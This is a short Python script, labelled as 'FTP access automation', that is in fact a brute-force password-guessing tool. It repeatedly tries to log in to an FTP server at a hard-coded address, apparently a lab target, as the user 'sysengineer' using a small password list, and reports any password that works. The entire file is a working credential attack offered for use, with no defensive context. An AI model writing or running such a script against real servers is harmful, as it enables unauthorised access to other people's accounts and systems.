import ftplib

print("FTP access automation Script")
# hostname or IP address of the FTP server
host = "10.10.10.3"
# username of the FTP server, root as default for linux
user = "sysengineer"
# port of FTP, aka 21
port = 21

def is_correct(password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    else:
        # correct credentials
        print("[+] Found credentials to FTP Server:", password)
        return True


# read the wordlist of passwords
passwords = ["james1", "james"]
print("[+] Passwords to try:", len(passwords))

# iterate over passwords one by one
# if the password is found, break out of the loop
for password in passwords:
    if is_correct(password):
        break
